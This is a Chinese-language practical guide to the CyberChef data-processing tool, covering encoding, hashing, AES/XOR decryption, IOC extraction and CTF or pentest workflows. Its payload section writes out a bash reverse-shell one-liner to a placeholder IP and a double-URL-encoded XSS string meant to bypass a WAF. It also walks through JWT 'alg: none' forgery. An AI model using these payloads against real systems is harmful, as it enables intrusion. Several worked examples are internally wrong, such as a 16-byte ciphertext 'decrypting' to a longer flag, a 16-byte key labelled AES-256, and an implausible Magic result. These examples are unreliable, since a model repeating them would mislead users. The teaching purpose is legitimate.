# CyberChef 实战使用指南

> GCHQ 出品的"网络瑞士军刀"——浏览器里拖拽操作链完成编解码、加密哈希、数据提取，CTF Misc/Crypto 方向与日常渗透数据处理的首选工具，每个功能都有可复现的实操。

***

## 目录

- [二、访问与部署](#二访问与部署)
- [三、界面布局与核心概念](#三界面布局与核心概念)
- [四、基本工作流](#四基本工作流)
- [五、操作分类总览](#五操作分类总览)
- [六、编码与解码实战](#六编码与解码实战)
- [七、加密与哈希实战](七加密与哈希实战)
- [八、Magic 自动识别](#八magic-自动识别)
- [九、数据提取与文本处理](#九数据提取与文本处理)
- [十、Recipe 的保存与分享](#十recipe-的保存与分享)
- [十一、进阶：Registers / Fork / Flow Control](#十一进阶registers--fork--flow-control)
- [十二、CTF 与渗透实战场景](#十二ctf-与渗透实战场景)
- [十三、常见问题排查](#十三常见问题排查)
- [十四、速查表](#十四速查表)

***

## 一、CyberChef 是什么

CyberChef 是英国政府通讯总部（GCHQ）开源的浏览器端数据处理工具，把"编码/解码/加密/哈希/提取/转换"等几百种操作做成可拖拽的积木，串成一条 Recipe（配方）一键执行。它的核心价值是**把日常写脚本才能干的杂活，变成浏览器里点几下就完成的可视化流水线**。

### 适用场景

| 场景         | 典型用途                                         |
| ---------- | -------------------------------------------- |
| CTF Misc   | 多层嵌套编码剥离、隐写数据解析、文件头还原                        |
| CTF Crypto | AES/DES/RSA/XOR 解密、哈希碰撞验证                    |
| 渗透测试       | 解码 Cookie/Token/JWT、构造 Payload、Defang 恶意 URL |
| 应急响应       | 解析日志里的 Base64/Hex 混淆、提取 IP/域名/邮箱             |
| 逆向分析       | 字节序转换、PEM/DER 证书解析、熵值计算                      |

### 在线版 vs 离线版

| 形态                  | 优点          | 缺点            |
| ------------------- | ----------- | ------------- |
| 在线版（gchq.github.io） | 即开即用、永远最新   | 依赖网络、敏感数据外发风险 |
| 离线版（本地静态文件）         | 数据不出网、可长期归档 | 需手动更新版本       |
| Docker 自建           | 内网团队共享、统一版本 | 需维护容器         |

> ⚠️ **合规提醒**：在线版会把你的 Input 数据留在浏览器里处理（不上传服务器，但走 CDN 加载），处理客户敏感数据时务必用本地离线版。无论哪种形态，CyberChef 仅用于授权的安全测试、CTF 与数据分析。

***

## 二、访问与部署

### 1. 在线直接用

最简单的方式，打开即用：

```
https://gchq.github.io/CyberChef/
```

### 2. 离线版（推荐用于敏感数据）

CyberChef 编译产物是纯静态站点，下载解压后直接双击 `index.html` 即可，无需服务器：

```bash
# 下载最新 release（GitHub Releases 页面找 CyberChef_vX.X.X.zip）
wget https://github.com/gchq/CyberChef/releases/latest/download/CyberChef_v10.18.0.zip
unzip CyberChef_v10.18.0.zip -d CyberChef
cd CyberChef
# Windows 直接双击 index.html，或用任意静态服务器
python3 -m http.server 8000
# 浏览器访问 http://localhost:8000
```

### 3. Kali Linux 安装

Kali 仓库已收录，apt 一键装：

```bash
sudo apt update && sudo apt install -y cyberchef
# 启动（Kali 菜单里也有图标）
cyberchef
# 或直接打开 /usr/share/cyberchef/index.html
```

### 4. Docker 自建（团队内网共享）

```bash
# 社区维护镜像
docker run -d --name cyberchef -p 8000:8000 \
  remnux/cyberchef
# 浏览器访问 http://localhost:8000

# 或自行构建
git clone https://github.com/gchq/CyberChef.git
cd CyberChef
npm install
npm run build
# 产物在 build/prod/，用任意静态服务器托管
```

### 5. 从源码构建最新版

```bash
git clone https://github.com/gchq/CyberChef.git
cd CyberChef
npm install
npm run dev   # 开发模式，热更新，访问 http://localhost:8080
npm run build # 生产构建
```

> 💡 **版本选择建议**：CTF 日常用在线版或离线 release 即可；处理客户数据、内网环境用 Docker 自建。离线版建议每季度更新一次，新操作（如新加密算法）会随版本加入。

***

## 三、界面布局与核心概念

CyberChef 界面分三栏，理解三个核心词就能上手：

```
┌──────────────┬───────────────────────────┬──────────────────┐
│  Operations  │       Recipe              │   Input/Output   │
│  操作库       │       配方（操作链）        │   输入/输出       │
│  (可搜索)     │   [Op1] → [Op2] → [Op3]   │                  │
│              │                           │   [Input 文本框]  │
│  按分类折叠   │   每个 Op 下方有参数        │   [Output 结果]   │
└──────────────┴───────────────────────────┴──────────────────┘
```

### 三个核心概念

| 概念                 | 含义                                      | 类比        |
| ------------------ | --------------------------------------- | --------- |
| **Operation（操作）**  | 一个具体的数据变换，如 `From Base64`、`AES Decrypt` | 流水线上的一个工位 |
| **Recipe（配方）**     | 多个 Operation 按顺序串联成的处理链                 | 整条流水线     |
| **Ingredient（配料）** | Operation 的参数，如 AES 的 Key、IV、Mode       | 工位的调节旋钮   |

### 关键按钮

- **Bake**：手动执行当前 Recipe（左下角）
- **Auto Bake**（魔术棒图标）：开启后 Input 一变就自动执行，调试时建议开启
- **Stop**：长时间运行（如暴力破解）时中断
- **Clean**：清空 Recipe（保留可撤销）
- **Clear**：清空 Input/Output
- **Save / Load**：保存/加载 Recipe（见第十章）
- **Magic**：一键自动识别（见第八章）

### Operation 的状态控制

每个拖入 Recipe 的 Operation 顶部有这些控件：

- **☑ 启用/禁用复选框**：临时禁用某个操作而不删除（调试时常用）
- **拖动手柄**：调整操作顺序
- **垃圾桶图标**：删除该操作
- **参数区**：输入框、下拉框，按操作不同而不同

> 💡 **调试技巧**：拿不准某个操作是否需要时，用复选框禁用它对比 Output 差异，比删除再重拖快得多。

***

## 四、基本工作流

一次典型的 CyberChef 处理流程：

```
拿到不明数据 → 粘进 Input
     ↓
先扔给 Magic 自动识别（第八章）
     ↓
识别失败 → 手动从外到内逐层拖操作
     ↓
每个操作配参数 → 看 Output 是否变清晰
     ↓
得到结果 → 复制走 / 保存 Recipe 复用
```

### 三步上手

**第 1 步：输入数据**

把待处理数据粘进右侧 Input 框。Input 上方可切换输入格式（Text / Hex / Base64 等），切到对应格式可避免二次解码的麻烦。

**第 2 步：拖操作到 Recipe**

两种方式：

- 从左侧 Operations 面板**双击**操作 → 自动加入 Recipe 末尾
- **拖拽**操作到 Recipe 指定位置（插入到中间某步时用这个）

左侧搜索框支持模糊搜索，输入 `base` 就能列出所有 Base 相关操作。

**第 3 步：配置参数并 Bake**

在 Recipe 里每个操作下方填参数，开启 Auto Bake 实时看 Output，或点 Bake 手动执行。

### 实操：3 分钟解码第一个数据

目标：解码 `ZmxhZ3tjeWJlcmNoZWZ9`

1. 打开 CyberChef，把 `ZmxhZ3tjeWJlcmNoZWZ9` 粘进 Input
2. 左侧搜索 `From Base64`，双击加入 Recipe
3. 开启 Auto Bake
4. Output 立刻显示 `flag{cyberchef}`

完工。整个过程没写一行代码。

***

## 五、操作分类总览

CyberChef 内置 400+ 操作，按左侧分类树组织。下表是安全场景高频分类：

| 分类               | 高频操作                                                                   | 典型用途      |
| ---------------- | ---------------------------------------------------------------------- | --------- |
| **Data format**  | From/To Base64、From/To Hex、From Charcode、From/To Base32、From/To Base58 | 编解码转换     |
| **Encryption**   | AES/DES/Blowfish/RC4 Encrypt/Decrypt、RSA、Triple DES                    | 对称/非对称加解密 |
| **Public Key**   | From PEM、RSA Encrypt/Decrypt、RSA Sign/Verify、Parse X.509               | 证书与公钥处理   |
| **Hashing**      | MD5、SHA 系列、CRC、HMAC、RIPEMD、NTLM、Scrypt                                 | 哈希计算与验证   |
| **Encoding**     | To/From Morse Code、Braille、Bacon、Base32、Punycode                       | 古典/小众编码   |
| **Arithmetic**   | XOR、ADD、SUB、Multiply、Divide、Bitwise ops                                | 字节级运算     |
| **Networking**   | Defang URL/IP、Parse IP、HTTP Request、User Agent                         | 网络数据处理    |
| **Extract**      | Extract IPs/URLs/Emails/Dates/MAC addresses                            | 从文本提取特征   |
| **Text**         | Find/Replace、Regular expression、Remove whitespace、Sort、Unique、Split    | 文本清洗      |
| **Utils**        | Magic、Remove null bytes、Count occurrences、Defang、To Table              | 杂项工具      |
| **Flow control** | Fork、Jump、Conditional Jump、Comment、Register、Subsection                 | 流程控制（进阶）  |
| **Date/Time**    | From/To UNIX Timestamp、Parse DateTime                                  | 时间戳处理     |
| **File system**  | Extract/Unzip files、Tar/Gzip/Deflate                                   | 文件解析      |

> 💡 **找操作的最快方式**：不要在分类树里翻，直接左侧搜索框输关键词。比如想"解 base64"就搜 `base64`，想"算 md5"就搜 `md5`，想"去空格"就搜 `whitespace` 或 `space`。

***

## 六、编码与解码实战

### 1. Base 系列

Base 家族是 CTF 和 Web 最高频的编码。CyberChef 对应操作都是 `From BaseXXX`（解码）/ `To BaseXXX`（编码）。

| 编码        | 解码操作                               | 编码操作                | 特征                      |
| --------- | ---------------------------------- | ------------------- | ----------------------- |
| Base64    | From Base64                        | To Base64           | `A-Za-z0-9+/=` 末尾常带 `=` |
| Base64URL | From Base64（勾 Remove non-alphabet） | To Base64（URL safe） | `-_` 替换 `+/`，无 `=`      |
| Base32    | From Base32                        | To Base32           | `A-Z2-7=`               |
| Base58    | From Base58                        | To Base58           | Bitcoin 地址字符集，无 `0OIl`  |
| Base85    | From Base85                        | To Base85           | ASCII 33-117，更紧凑        |

实操：解码 Base64 套 Base32

```
Input: NBUGMY3UMVZGC4TJMZRGCZTFMVSQ====
Recipe: From Base32 → From Base64
Output: flag{nested_encoding}
```

> 💡 **嵌套解码顺序**：从外到内剥。最外层是什么编码就先 From 什么。判断方法：Base32 只有大写字母和 2-7，Base64 大小写数字加 `+/`，Hex 只有 `0-9a-f`。看一眼字符集基本能猜出最外层。

### 2. Hex / Charcode

Hex（十六进制）和 Charcode（ASCII 码）常用于混淆字符串。

```
# Hex 转字符串
Input: 666c61677b6865787d
Recipe: From Hex
Output: flag{hex}

# Charcode（十进制 ASCII，空格或逗号分隔）
Input: 102 108 97 103 123 99 125
Recipe: From Charcode
Output: flag{c}

# Charcode（\\x 转义形式）
Input: \x66\x6c\x61\x67
Recipe: From Hex (勾 "Force.. \x..")
```

### 3. URL 编码

Web 场景必用。注意 `%xx` 是 URL 编码，`&#xx;` 是 HTML 实体。

```
# URL 解码
Input: %66%6c%61%67%7b%75%72%6c%7d
Recipe: URL Decode
Output: flag{url}

# 多层 URL 编码（%25 本身是 % 的编码）
Input: %2566%256c%2561%2567
Recipe: URL Decode → URL Decode
Output: flag
```

### 4. Unicode 转义

```
# \u 形式
Input: \u0066\u006c\u0061\u0067
Recipe: Unescape Unicode Characters
Output: flag

# HTML 实体 &#x 十六进制
Input: &#x66;&#x6c;&#x61;&#x67;
Recipe: From HTML Entity
Output: flag
```

### 5. 摩尔斯电码

```
Input: ..-. .-.. .- --. -....- -....-
Recipe: From Morse Code
Output: FLAG--
# 注意摩尔斯的单词分隔符默认是斜杠 /，可在参数里改
```

### 6. ROT13 / 凯撒密码

```
Input: synt{ebg13}
Recipe: ROT13
Output: flag{rot13}

# 未知偏移的凯撒 → 用 Magic 自动尝试所有 25 种偏移
# 或用 Brute Force 操作：ROT47 Brute Force / Caesar Box Cipher
```

***

## 七、加密与哈希实战

### 1. AES 加解密

AES 是 CTF Crypto 和实际开发中最常见的对称加密。CyberChef 的 `AES Encrypt/Decrypt` 参数齐全。

实操：AES-CBC 解密

```
# 题目给出：
#   密文(Hex): 7a0f4c8b9d2e1f6a3b5c8d7e9f0a1b2c
#   Key(Hex):  0123456789abcdef0123456789abcdef
#   IV(Hex):   fedcba9876543210fedcba9876543210
#   算法: AES-256-CBC

Recipe: AES Decrypt
  Key (Hex):        0123456789abcdef0123456789abcdef
  IV (Hex):         fedcba9876543210fedcba9876543210
  Mode:             CBC
  Input format:     Hex
  Output format:    Text
  Padding:          PKCS#7
Output: flag{aes_cbc_decrypt}
```

> 💡 **AES 参数对齐表**：AES-128/192/256 由 Key 长度决定（16/24/32 字节）。Key 给的是 Hex 就把 Input format 设 Hex，给的是文本字符串就设 UTF8。Padding 不对会报错或末尾乱码，先试 PKCS#7，不行再试 Zero、ISO10126。

### 2. DES / 3DES / RC4

```
# DES 解密
Recipe: DES Decrypt
  Key: 8字节密码
  IV: 8字节
  Mode: ECB / CBC

# RC4（流密码，无 IV，只有 Key）
Recipe: RC4
  Key: "secret"
  Input format: Hex
```

### 3. RSA

RSA 涉及公钥/私钥和 PEM 格式，CyberChef 提供 `RSA Encrypt/Decrypt` 和 `Parse ASN.1` 等。

```
# 用私钥解密（PEM 格式）
Recipe: RSA Decrypt
  PEM Private Key: -----BEGIN RSA PRIVATE KEY----- ... -----END RSA PRIVATE KEY-----
  Input: Base64 密文

# 解析公钥/私钥结构
Recipe: Parse ASN.1 hex
# 或 From PEM 看模数 n、指数 e
```

### 4. XOR

XOR 是 CTF 高频，已知 key 直接解，未知 key 可用 `XOR Brute Force`。

```
# 已知 key
Recipe: XOR
  Key: UTF8 "secret"
  Scheme: Standard

# 未知 key，爆破单字节
Recipe: XOR Brute Force
  Key length: 1
  Sample length: 100
# 会列出 0x00-0xFF 所有可能，肉眼找可读结果
```

### 5. 哈希计算

```
# 算 MD5
Recipe: MD5
Input: hello → Output: 5d41402abc4b2a76b9719d911017c592

# 算多种哈希一次出
Recipe: MD5 → 同时也可分别拖 SHA1 / SHA256 / SHA512

# HMAC（带密钥哈希，常用于 API 签名验证）
Recipe: HMAC
  Hashing function: SHA256
  Key: "my_secret"
```

| 哈希算法        | 操作             | 输出长度                 |
| ----------- | -------------- | -------------------- |
| MD5         | MD5            | 32 Hex               |
| SHA-1       | SHA1           | 40 Hex               |
| SHA-256     | SHA256         | 64 Hex               |
| SHA-512     | SHA512         | 128 Hex              |
| CRC32       | CRC32          | 8 Hex                |
| NTLM        | NTLM           | 32 Hex（Windows 密码哈希） |
| HMAC-SHA256 | HMAC（选 SHA256） | 64 Hex               |

### 6. 哈希识别

拿到一串哈希不知道是什么算法，用 `Analyse hash` 操作自动判断：

```
Input: 5d41402abc4b2a76b9719d911017c592
Recipe: Analyse hash
Output: Likely MD5 (32 hex chars)
```

***

## 八、Magic 自动识别

Magic 是 CyberChef 的杀手锏——把不明数据扔进去，它自动尝试各种编码/加密组合，按可能性排序列出结果。

### 基本用法

1. 数据粘进 Input
2. 搜索 `Magic`，拖入 Recipe
3. Bake，看 Output 列表

Magic 会输出多个候选结果，每行显示：识别到的操作链 + 置信度 + 结果片段。

### 关键参数

| 参数                             | 含义           | 建议值             |
| ------------------------------ | ------------ | --------------- |
| **Depth（深度）**                  | 最多尝试几层嵌套     | 默认 3，识别不出调到 5、7 |
| **Intensive Mode**             | 暴力尝试更多组合（更慢） | 普通模式失败再开        |
| **Extensive language support** | 支持更多语言字符集判断  | 中文数据时开          |
| **Guess length**               | 猜测原始数据长度     | 一般默认            |

### 实操：Magic 一键破解多层编码

```
Input: 4141414141414141415a6d78685958426b6157
Recipe: Magic (Depth 4, Intensive)
Output 候选1（置信度高）:
  From Hex → From Base64 → ROT13 → ...
  结果: flag{magic_solved_it}
```

> 💡 **Magic 使用策略**：
>
> 1. 拿到任何不明数据，第一步永远是 Magic
> 2. Depth 3 识别不出就调到 5、7
> 3. 仍不行开 Intensive Mode
> 4. Magic 给出操作链后，把链子复制到 Recipe 里手动微调，比一次性 Magic 更可控
> 5. Magic 对"有特征"的编码（Base64、Hex）很准，对"无特征"的对称加密（需要 key）无能为力——那种情况要靠题目给 key。

***

## 九、数据提取与文本处理

渗透和应急响应里，从大段文本批量提取特征是高频需求。

### 1. 提取 IP / 域名 / 邮箱 / URL

Extract 分类下一系列操作直接用正则内置好：

```
Input: （一段日志）
2026-07-09 10:23:15 login from 192.168.1.105
failed: admin@corp.com / mailto: leak@dark.web
visit http://malware.example.com/c2?cmd=1

Recipe（按需选）:
  Extract IP addresses    → 192.168.1.105
  Extract email addresses → admin@corp.com, leak@dark.web
  Extract URLs            → http://malware.example.com/c2?cmd=1
  Extract domains         → malware.example.com
```

### 2. 正则提取 / 替换

`Regular expression` 操作支持自定义 PCRE 正则，可提取（capture group）或替换。

```
# 提取所有 flag{...}
Recipe: Regular expression
  Built in regex: User defined
  Regex: flag\{[^}]+\}
  Output format: List capture groups

# 替换（去注释）
Recipe: Find / Replace
  Find: #.*$
  Replace: (空)
  Regular expression: 勾选
```

### 3. Defang（让 URL/IP 失效）

写报告、分享 IOC 时，把恶意 URL 改成不可点击的形式，防止误点：

```
Input: http://malware.example.com/c2
Recipe: Defang URL
Output: hxxp[://]malware[.]example[.]com/c2

Input: 192.168.1.105
Recipe: Defang IP Addresses
Output: 192.168.1[.]105
```

> 💡 **报告必备**：安全报告里的所有 IOC 都要 Defang。CyberChef 一键搞定，比手动改 `.` → `[.]` 可靠。

### 4. 去空字节 / 去空白

```
# 去 \x00 空字节（C 字符串残留）
Recipe: Remove null bytes

# 去所有空白（含换行）
Recipe: Remove whitespace

# 去首尾空白
Recipe: Trim
```

### 5. 排序 / 去重

```
Input: （多行数据）
Recipe: Sort (勾 Reverse 倒序)
Recipe: Unique  → 去重
```

***

## 十、Recipe 的保存与分享

Recipe 是 CyberChef 的灵魂——配好一条操作链，可以保存、复用、分享给同事。

### 1. 生成分享链接

最常用的方式，把整个 Recipe 编码进 URL：

1. 配好 Recipe 后，点顶部 **Save** 标签
2. 选 **Recipe format: Compact JSON**
3. 复制生成的链接（形如 `https://gchq.github.io/CyberChef/#recipe=From_Base64...`）
4. 别人打开链接，Recipe 自动加载

> 💡 **链接分享的妙用**：CTF 团队里把"某类题的标准解法 Recipe"做成链接存书签，遇到同类题直接打开改 Input 即可。

### 2. 导出为文件

1. Save 标签 → Recipe format 选 `JSON`
2. 点 **Download** 保存为 `.json` 文件
3. 用 Load 标签上传该文件即可还原

### 3. 复制为文本

Save 标签可直接复制 Recipe 的 JSON 文本，粘到文档、工单里。Load 时粘回即可还原。

### 4. 实操：保存一条常用 Recipe

场景：把"JWT 解码查看 payload"这条 Recipe 存下来复用。

```
Recipe:
  From Base64 (Alphabet: A-Za-z0-9-_, Remove non-alphabet chars: 勾)
  JSON Beautify

# 保存后链接：
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_%2B/%3D',true)JSON_Beautify('%20%20')
```

下次拿到 JWT，打开链接粘进 token 的 payload 段即可看格式化 JSON。

***

## 十一、进阶：Registers / Fork / Flow Control

掌握这三样，CyberChef 从"工具"升级成"可视化脚本平台"。

### 1. Registers（寄存器/变量）

Register 操作把当前数据存入 `$R0`、`$R1`…，后续操作可用 `$R0` 引用。用于"在链中暂存中间值，后面再用"。

```
# 场景：从一段数据提取 key，再用 key 解密后续内容
Input: key=0123456789abcdef;data=<密文>

Recipe:
  1. Find / Replace  (用正则提取出 key 部分)  → 得到 key
  2. Register        (Store in: $R0)          → key 存入 $R0
  3. ... 后续 AES Decrypt 的 Key 参数填 $R0
```

> Register 的典型用法：处理"前半段是元数据/密钥，后半段是密文"这种结构化题目。

### 2. Fork（分支批处理）

Fork 把 Input 按分隔符切成多份，对每份独立跑一段子 Recipe，最后合并。用于批量处理多行数据。

```
Input:
ZmxhZzEK
ZmxhZzIK
ZmxhZzMK

Recipe: Fork
  Split delimiter: \\n
  Fork delimiter: \\n
  Subrecipe: From Base64

Output:
flag1
flag2
flag3
```

> 💡 **批量解码利器**：日志里几百条 Base64，一条条贴太蠢，Fork 一次搞定。分隔符默认换行，也支持逗号、自定义正则。

### 3. Flow Control：Jump / Conditional Jump

- **Jump**：跳转到 Recipe 中第 N 个操作（实现循环/跳过）
- **Conditional Jump**：满足条件才跳，可做循环
- **Comment**：给 Recipe 加注释（不执行，纯说明）

```
# 场景：循环 XOR 解密直到出现 "flag"
Recipe:
  1. XOR Brute Force
  2. Conditional Jump (如果 Output 不含 "flag"，跳回 1)
```

### 4. Subsection

对 Input 的某一段（而非全部）应用操作。比如只对每行的前 8 字节做处理，其余保留。

```
Recipe: Subsection
  Section: ^.{8}        # 正则匹配每行前8字符
  Subrecipe: To Hex     # 只把这部分转 Hex
```

### 5. 实操进阶：带 key 提取的多步解密

综合用 Register + Fork + 正则：

```
Input: （多行，每行格式 id:base64data）

Recipe:
  1. Fork (split: \\n)
  2. Find / Replace (正则 ^.*?: 提取 data 部分)
  3. From Base64
  4. Register ($R0 = 解码结果)
  5. ...
```

***

## 十二、CTF 与渗透实战场景

把前面学的串起来，按真实场景给标准 Recipe。

### 场景 1：CTF Misc——多层嵌套编码

题目给一串不明数据，不知道套了几层。

```
# 标准解法
1. 先 Magic (Depth 5) 看能否自动剥
2. 失败 → 手动观察字符集判断最外层
3. 从外到内逐层 From：
   From Hex → From Base64 → From Base32 → URL Decode
4. 出现 flag{...} 即成功

# 判断字符集速查
只有 0-9a-f        → Hex
A-Z2-7=            → Base32
A-Za-z0-9+/=       → Base64
可见 ASCII 且可读   → 可能是 ROT13/凯撒，用 Magic
```

### 场景 2：CTF Crypto——AES 题三连

```
# 题型A：给 key/IV/密文，直接 AES Decrypt
Recipe: AES Decrypt (填齐 Key/IV/Mode/Padding)

# 题型B：只给密文，key 隐藏在题目描述里（如题目名）
# → 先把题目名 Register 成 $R0，再 AES Decrypt 的 Key 填 $R0

# 题型C：ECB 模式 + 密钥爆破
# → 用 Fork 配合字典循环 AES Decrypt，Conditional Jump 找含 flag 的
```

### 场景 3：渗透——JWT 解析与伪造

```
# 解析 JWT 三段（header.payload.signature）
# JWT 用 Base64URL 编码（- 替 +，_ 替 /，无 =）
Recipe:
  1. Split  (Delimiter: .)           # 拆三段
  2. From Base64 (Alphabet: A-Za-z0-9-_, Remove non-alphabet)
  3. JSON Beautify

# 伪造 JWT（alg: none 绕过）
# 手动改 header {"alg":"none","typ":"JWT"}
# To Base64URL → 拼 . → 空 signature 段
Recipe:
  JSON: {"alg":"none","typ":"JWT"}
  → To Base64 (URL safe)
  → 拼接 . + Base64URL(payload) + .
```

### 场景 4：应急响应——日志 IOC 提取 + Defang

```
Input: 一段访问日志（含恶意 IP、URL、UA）

Recipe:
  1. Extract URLs          → 提取所有 URL
  2. Defang URL            → 转 hxxp[://]...[.]
  3. （另开链）Extract IP addresses → Defang IP Addresses
  4. 去重 (Unique)

Output: 可直接贴进 IOC 报告的失效 URL/IP 列表
```

### 场景 5：逆向——字节序转换与文件头识别

```
# 小端序十六进制转整数
Input: 78563412
Recipe: From Hex → Swap endianness → To Decimal
Output: 305419896 (= 0x12345678)

# 文件头识别（magic number）
Input: 89504e470d0a1a0a...
Recipe: From Hex → 搜索 PNG 文件头 89 50 4E 47
→ 确认是 PNG，改后缀即可打开
```

### 场景 6：Web——构造 Payload

```
# 构造 Base64 编码的反弹 shell payload
Input: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
Recipe: To Base64

# URL 双重编码绕 WAF
Input: <script>alert(1)</script>
Recipe: URL Encode → URL Encode
```

### 场景 7：批量哈希验证

```
# 验证一批文件 MD5 是否匹配
Input: （每行一个文件内容）
Recipe: Fork (split \\n) → MD5
Output: 每行对应一个 MD5，与预期值对比
```

***

## 十三、常见问题排查

| 问题                            | 原因                             | 解决                                                      |
| ----------------------------- | ------------------------------ | ------------------------------------------------------- |
| Output 出现乱码/方块                | 解码用错了编码方式                      | 检查 Input format 是否设对；先 Magic 自动识别                       |
| AES Decrypt 报 "Padding error" | Key/IV/Mode/Padding 没对齐        | 确认 Key 长度对应 AES-128/192/256；Padding 换 PKCS#7/Zero 试     |
| Magic 识别不出结果                  | 嵌套太深或需密钥                       | Depth 调到 5/7；开 Intensive；若是对称加密需题目给 key                 |
| From Base64 输出仍是乱码            | 含非 Base64 字符或用 URL 安全变体        | 勾 "Remove non-alphabet chars"；Alphabet 改 URL safe（-、\_） |
| 复制 Input 后格式变了                | Input format 默认 Text，把 Hex 当文本 | Input 上方下拉切到 Hex/Base64                                 |
| Recipe 链顺序对但结果不对              | 操作间数据格式不衔接                     | 每步后看 Output，确认上一步输出格式 = 下一步期望输入                         |
| Fork 后只剩第一行结果                 | 分隔符设错                          | Fork 的 split delimiter 与实际分隔符一致（换行用 `\n`）               |
| 大数据 Bake 卡死                   | 数据量过大或循环死                      | 分批处理；关闭 Auto Bake 改手动；用 Stop 中断                         |
| 离线版打不开                        | 直接 file:// 打开部分功能受限            | 用 `python -m http.server` 起静态服务访问                       |

> ⚠️ **Auto Bake 的坑**：处理大 Input 时 Auto Bake 每次输入变化都全量重跑，会卡。建议大数据先关 Auto Bake，输完再点 Bake 一次。

***

## 十四、速查表

### 高频操作快查

| 想做什么        | 用哪个操作                                  |
| ----------- | -------------------------------------- |
| 解 Base64    | From Base64                            |
| 解 Hex       | From Hex                               |
| 解 URL 编码    | URL Decode                             |
| 解摩尔斯        | From Morse Code                        |
| 算 MD5/SHA   | MD5 / SHA1 / SHA256                    |
| AES 解密      | AES Decrypt                            |
| XOR 解密      | XOR / XOR Brute Force                  |
| 自动识别        | Magic                                  |
| 提 IP/URL/邮箱 | Extract IPs / URLs / email addresses   |
| 让 URL 失效    | Defang URL                             |
| 批量处理多行      | Fork                                   |
| 暂存中间值       | Register                               |
| 字节序反转       | Swap endianness                        |
| 时间戳转换       | From / To UNIX Timestamp               |
| JSON 格式化    | JSON Beautify                          |
| JWT 解码      | From Base64 (URL safe) + JSON Beautify |

### 常见编码字符集速查

| 编码         | 字符集                     | 标识特征         |
| ---------- | ----------------------- | ------------ |
| Base64     | A-Z a-z 0-9 + /         | 末尾 `=` 补齐    |
| Base64URL  | A-Z a-z 0-9 - \_        | 无 `=`，URL 安全 |
| Base32     | A-Z 2-7                 | 末尾 `=` 补齐    |
| Hex        | 0-9 a-f                 | 仅 16 个字符     |
| Base58     | 1-9 A-H J-N P-Z a-k m-z | 无 `0OIl`     |
| URL 编码     | %xx                     | `%` 开头       |
| 摩尔斯        | . - / 空格                | 点划组成         |
| Unicode 转义 | \uXXXX                  | `\u` 开头      |
| HTML 实体    | \&#xx; \&#xx            | `&#` 开头      |

### AES 参数速查

| AES 变体  | Key 长度 | IV 长度 | 常见 Mode               |
| ------- | ------ | ----- | --------------------- |
| AES-128 | 16 字节  | 16 字节 | ECB / CBC / CTR / GCM |
| AES-192 | 24 字节  | 16 字节 | 同上                    |
| AES-256 | 32 字节  | 16 字节 | 同上                    |

> ECB 不需 IV（但不安全，CTF 常见）；CBC/CTR/GCM 需 IV。Padding 优先试 PKCS#7。

### Magic 深度建议

| 数据复杂度   | Depth | Intensive |
| ------- | ----- | --------- |
| 单层编码    | 1-2   | 否         |
| 2-3 层嵌套 | 3（默认） | 否         |
| 深度嵌套    | 5-7   | 是         |
| 完全未知    | 7     | 是         |

### 实用 Recipe 链接（自建可存书签）

| 用途            | 核心操作链                                  |
| ------------- | -------------------------------------- |
| JWT 解码        | From Base64 (URL safe) → JSON Beautify |
| 多层 Base 解码    | From Hex → From Base64 → From Base32   |
| IOC 提取+Defang | Extract URLs → Defang URL              |
| 批量 MD5        | Fork → MD5                             |
| AES-CBC 解密    | AES Decrypt (填 Key/IV/CBC/PKCS7)       |
| XOR 爆破        | XOR Brute Force                        |

### 官方与社区资源

| 资源         | 地址                                                  |
| ---------- | --------------------------------------------------- |
| 在线版        | <https://gchq.github.io/CyberChef/>                 |
| GitHub 源码  | <https://github.com/gchq/CyberChef>                 |
| 操作列表文档     | <https://github.com/gchq/CyberChef/wiki/Operations> |
| Release 下载 | <https://github.com/gchq/CyberChef/releases>        |

